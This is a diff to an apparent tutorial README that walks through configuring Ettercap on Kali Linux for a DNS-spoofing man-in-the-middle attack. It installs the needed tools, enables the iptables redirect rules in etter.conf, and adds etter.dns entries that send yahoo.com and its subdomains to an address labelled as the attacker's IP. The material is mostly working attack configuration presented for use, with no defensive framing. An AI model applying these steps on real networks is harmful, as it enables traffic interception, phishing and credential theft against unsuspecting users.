@@ -30,23 +30,24 @@
         sudo apt-get install ettercap
         
 4. installing apache server
-        use following command to install apache server on kali
+     use following command to install apache server on kali
         
         sudo apt-get install apache2
-        
-
-        
+                
 5. install Iptable
-
+     use following command to install iptables on kali
+     
         sudo apt-get install iptables
-        
-
-        
-        
+       
 # Getting Ready
 
 
 ### Configuring
+      
+                 
+##### Edit Ettercap configuration file
+                 
+             
 
 We now need to edit the Ettercap configuration file since it is our application of choice for today.
 Let's navigate to /etc/ettercap/etter.conf and open the file with a text editor like leafpad and edit the file. 
@@ -82,3 +83,19 @@ Now scroll down until you find the heading that says Linux and under that remove
            redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
            redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
 
+##### Edit Ettercap.dns file
+
+  Edit the domain name to spoof and  edit the IP address to attackers IP address and save the file
+
+        #                                                                          #
+        # Sample hosts file for dns_spoof plugin                                   #
+        #                                                                          #
+        # the format is (for A query):                                             #
+         *yahoo.com 		A	 172.20.10.4
+         www.yahoo.com 		A	 172.20.10.4
+         *.yahoo.com		A	 172.20.10.4	
+        #
+        #   *.foo.com          A 168.44.55.66 [optional TTL]                       #
+        #      
+        
+ 
